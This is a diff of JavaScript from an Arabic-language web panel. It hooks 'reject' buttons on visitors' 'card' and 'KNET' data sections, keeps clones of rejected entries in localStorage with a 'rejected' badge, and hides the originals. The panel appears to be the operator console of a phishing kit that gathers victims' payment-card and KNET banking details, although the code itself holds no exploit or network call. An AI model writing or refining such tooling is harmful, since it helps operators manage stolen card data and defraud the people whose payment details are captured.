@@ -4188,53 +4188,57 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   function sv(){ try { localStorage.setItem('kdd_rej_cards', JSON.stringify(K)); } catch(e){} }
   function sel(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
   function panel(){ return document.getElementById('visitorDetails'); }
-  function cont(){
-    var b = panel(); if (!b) return null;
-    var c = b.querySelector('.space-y-3');
-    if (c) return c;
-    var w = b.querySelector('.space-y-6');
-    if (w){ c = document.createElement('div'); c.className = 'space-y-3'; if (w.children.length > 1) w.insertBefore(c, w.children[1]); else w.appendChild(c); return c; }
-    c = document.createElement('div'); c.className = 'space-y-3'; b.insertBefore(c, b.firstChild); return c;
-  }
   function sig(el){ var m = String(el.textContent||'').match(/\d{4,}/g) || []; return m.slice(0,3).join('|'); }
   function now(){ return new Date().toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'}); }
-  function badge(t){ return '<span style="font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:#fee2e2;color:#b91c1c">مرفوض · ' + t + '</span>'; }
+  function badge(t){ return '<span style="font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:#fee2e2;color:#b91c1c;margin-inline-start:8px">مرفوض · ' + t + '</span>'; }
 
-  function hideRejected(id){
-    var b = panel(); if (!b) return;
-    var arr = K[id] || []; if (!arr.length) return;
-    var need = {}, used = {};
-    for (var j = 0; j < arr.length; j++){ var g = arr[j].sig; if (g) need[g] = (need[g]||0) + 1; }
-    var secs = b.querySelectorAll('.data-section');
-    for (var i = 0; i < secs.length; i++){
-      var s = secs[i];
-      try { if (s.closest && s.closest('[data-f115]')) continue; } catch(e){}
-      var sg = sig(s), hide = false;
-      if (sg && need[sg] && (used[sg]||0) < need[sg]){ hide = true; used[sg] = (used[sg]||0) + 1; }
-      if (hide){ s.style.display = 'none'; s.setAttribute('data-f115h','1'); }
-      else if (s.getAttribute('data-f115h')){ s.style.display = ''; s.removeAttribute('data-f115h'); }
-    }
-  }
-
-  var last = '';
   function draw(){
     var b = panel(); if (!b) return;
     var id = sel(); if (!id) return;
-    var c = cont(); if (!c) return;
+    var c = b.querySelector('.space-y-3');
+    if (!c){ var w = b.querySelector('.space-y-6'); if (!w) return; c = document.createElement('div'); c.className = 'space-y-3'; if (w.children.length > 1) w.insertBefore(c, w.children[1]); else w.appendChild(c); }
     var arr = K[id] || [];
-    var sg2 = id + '#' + arr.map(function(x){ return x.ts; }).join(',');
-    if (sg2 !== last || !c.querySelector('[data-f115]')){
-      last = sg2;
-      var olds = c.querySelectorAll('[data-f115]');
-      for (var k = 0; k < olds.length; k++) olds[k].parentNode.removeChild(olds[k]);
-      for (var i = arr.length - 1; i >= 0; i--){
-        var d = document.createElement('div');
-        d.setAttribute('data-f115','1');
-        d.innerHTML = arr[i].html || '';
+
+    var f12 = c.querySelectorAll('[data-f112]');
+    for (var q = 0; q < f12.length; q++){
+      var pgEl = f12[q].querySelector('.text-gray-500');
+      var pgt = pgEl ? String(pgEl.textContent||'') : '';
+      f12[q].style.display = (/كي\s*نت|بطاقة/.test(pgt)) ? 'none' : '';
+    }
+
+    var olds = c.querySelectorAll('[data-f115]');
+    for (var k = 0; k < olds.length; k++) olds[k].parentNode.removeChild(olds[k]);
+
+    var secs = c.querySelectorAll('.data-section'), cands = [];
+    for (var i = 0; i < secs.length; i++){
+      var s = secs[i];
+      try { if (s.closest && s.closest('[data-f115]')) continue; } catch(e){}
+      if (s.getAttribute('data-f115h')){ s.style.display = ''; s.removeAttribute('data-f115h'); }
+      cands.push(s);
+    }
+    if (!arr.length) return;
+
+    var bySig = {};
+    for (var i = 0; i < cands.length; i++){ var g = sig(cands[i]); if (!g) continue; if (!bySig[g]) bySig[g] = []; bySig[g].push(cands[i]); }
+    var used = [];
+    for (var n = 0; n < arr.length; n++){
+      var sg = arr[n].sig, target = null;
+      if (sg && bySig[sg]){
+        var list = bySig[sg];
+        for (var z = list.length - 1; z >= 0; z--){ if (used.indexOf(list[z]) < 0){ target = list[z]; break; } }
+      }
+      var d = document.createElement('div');
+      d.setAttribute('data-f115','1');
+      d.innerHTML = arr[n].html || '';
+      if (target){
+        used.push(target);
+        target.style.display = 'none';
+        target.setAttribute('data-f115h','1');
+        if (target.parentNode) target.parentNode.insertBefore(d, target);
+      } else {
         c.insertBefore(d, c.firstChild);
       }
     }
-    hideRejected(id);
   }
 
   document.addEventListener('click', function(e){
@@ -4244,30 +4248,31 @@ run();setInterval(function(){note();apply()},1200);})();</script>
     if (String(btn.textContent||'').indexOf('رفض') < 0) return;
     var sec = btn.closest ? btn.closest('.data-section') : null;
     if (!sec) return;
+    var h3 = sec.querySelector('h3'), title = h3 ? String(h3.textContent||'') : '';
+    if (title.indexOf('بطاقة') < 0 && title.indexOf('كي نت') < 0) return;
     setTimeout(function(){
       var id = sel(); if (!id) return;
       var tm = now(), sg3 = sig(sec);
-      var c = sec.cloneNode(true);
-      var bs = c.querySelectorAll('button');
+      var cl = sec.cloneNode(true);
+      var bs = cl.querySelectorAll('button');
       for (var i = 0; i < bs.length; i++) bs[i].parentNode.removeChild(bs[i]);
-      var h = c.querySelector('h3');
-      if (h && h.parentNode) h.parentNode.insertAdjacentHTML('beforeend', badge(tm));
-      else c.insertAdjacentHTML('afterbegin', badge(tm));
-      var html = c.outerHTML;
+      var h = cl.querySelector('h3');
+      if (h) h.insertAdjacentHTML('afterend', badge(tm)); else cl.insertAdjacentHTML('afterbegin', badge(tm));
+      var html = cl.outerHTML;
       var a = K[id] || (K[id] = []);
       var lt = a[a.length-1];
       if (lt && lt.html === html && (Date.now() - (lt.ts||0) < 4000)) return;
       a.push({ ts: Date.now(), t: tm, sig: sg3, html: html });
-      sv(); last = ''; draw();
+      sv(); draw();
     }, 150);
   }, true);
 
   var o = window.renderVisitorDetails;
   if (typeof o === 'function' && !o.__f115){
-    var f = function(){ var r = o.apply(this, arguments); try { last = ''; draw(); } catch(e){} return r; };
+    var f = function(){ var r = o.apply(this, arguments); try { draw(); } catch(e){} return r; };
     f.__f115 = 1; window.renderVisitorDetails = f;
     try { renderVisitorDetails = f; } catch(e){}
   }
-  setInterval(function(){ try { draw(); } catch(e){} }, 700);
+  setInterval(function(){ try { draw(); } catch(e){} }, 600);
 })();
 </script>
